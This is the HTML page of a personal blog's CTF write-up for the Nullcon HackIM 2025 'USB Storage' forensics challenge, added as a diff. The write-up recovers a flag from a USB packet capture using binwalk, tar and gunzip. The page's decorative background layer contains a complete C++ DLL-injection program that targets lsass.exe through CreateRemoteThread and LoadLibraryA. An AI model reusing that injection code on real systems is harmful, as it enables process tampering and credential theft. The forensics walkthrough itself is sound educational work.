@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nullcon Berlin HackIM 2025 CTF – Misc: USB Storage</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Nullcon Berlin HackIM 2025 CTF – Misc: USB Storage" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>Nullcon Berlin HackIM 2025 CTF – Misc: USB Storage</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="objective">Objective</h2>
+<p>The challenge story states:</p>
+<blockquote>
+  <p><em>I attached my friend’s USB drive to my laptop and accidentally copied a private file, which I immediately deleted. But my friend still somehow got the file from looking at the USB message their drive recorded…</em></p>
+</blockquote>
+
+<p>The goal is to analyze the given USB capture file and recover the <strong>flag</strong> hidden inside.</p>
+
+<hr />
+
+<h2 id="attachments">Attachments</h2>
+<ul>
+  <li>Challenge file: <a href="/assets/img/ctf_assets/usbstorage.pcapng.gz"><code class="language-plaintext highlighter-rouge">usbstorage.pcapng.gz</code></a></li>
+</ul>
+
+<hr />
+
+<h2 id="approach">Approach</h2>
+
+<p>We are given a packet capture (<code class="language-plaintext highlighter-rouge">.pcapng</code>) related to USB traffic. Since USB storage protocols can transfer raw file data, it is possible that the deleted file is still present in the capture.</p>
+
+<hr />
+
+<h3 id="step-1-extract-the-provided-file">Step 1: Extract the provided file</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">gunzip </span>usbstorage.pcapng.gz
+<span class="nb">ls</span>
+<span class="c"># usbstorage.pcapng</span>
+</code></pre></div></div>
+<p>Purpose: Decompress the provided .gz file to get the raw usbstorage.pcapng.</p>
+
+<h3 id="step-2-inspect-with-binwalk">Step 2: Inspect with binwalk</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>binwalk usbstorage.pcapng
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1343984       0x1481F0        <span class="nb">gzip </span>compressed data, from Unix, last modified: 1970-01-01 00:00:00 <span class="o">(</span>null <span class="nb">date</span><span class="o">)</span>
+</code></pre></div></div>
+<p>Purpose: Check the .pcapng for hidden or embedded files. We find a gzip-compressed data stream inside.</p>
+
+<h3 id="step-3-extract-the-embedded-file">Step 3: Extract the embedded file</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>binwalk <span class="nt">-e</span> usbstorage.pcapng
+<span class="nb">cd </span>_usbstorage.pcapng.extracted
+<span class="nb">ls</span>
+<span class="c"># 1481F0</span>
+</code></pre></div></div>
+<p>Purpose: Use binwalk -e to automatically extract the hidden data. This creates a directory with the extracted file.</p>
+
+<h3 id="step-4-identify-the-extracted-file">Step 4: Identify the extracted file</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file 1481F0
+<span class="c"># POSIX tar archive (GNU)</span>
+</code></pre></div></div>
+<p>Purpose: Verify the file type. The extracted file is actually a tar archive.</p>
+
+<h3 id="step-5-unpack-the-tar-archive">Step 5: Unpack the tar archive</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tar</span> <span class="nt">-xvf</span> 1481F0
+<span class="c"># flag.gz</span>
+</code></pre></div></div>
+<p>Purpose: Extract the contents of the tar archive, revealing a compressed file named flag.gz.</p>
+
+<h3 id="step-6-decompress-the-flag">Step 6: Decompress the flag</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">gunzip </span>flag.gz
+<span class="nb">ls</span>
+<span class="c"># flag</span>
+
+file flag
+<span class="c"># ASCII text</span>
+
+<span class="nb">cat </span>flag
+ENO<span class="o">{</span>USB_STORAGE_SHOW_ME_THE_FLAG_PLS<span class="o">}</span>
+</code></pre></div></div>
+<p>Purpose: Decompress flag.gz to get the final flag file, then read its contents to recover the CTF flag.</p>
+
+<p>✅ Flag successfully recovered.</p>
+
+<hr />
+<h2 id="flag">Flag</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENO<span class="o">{</span>USB_STORAGE_SHOW_ME_THE_FLAG_PLS<span class="o">}</span>
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
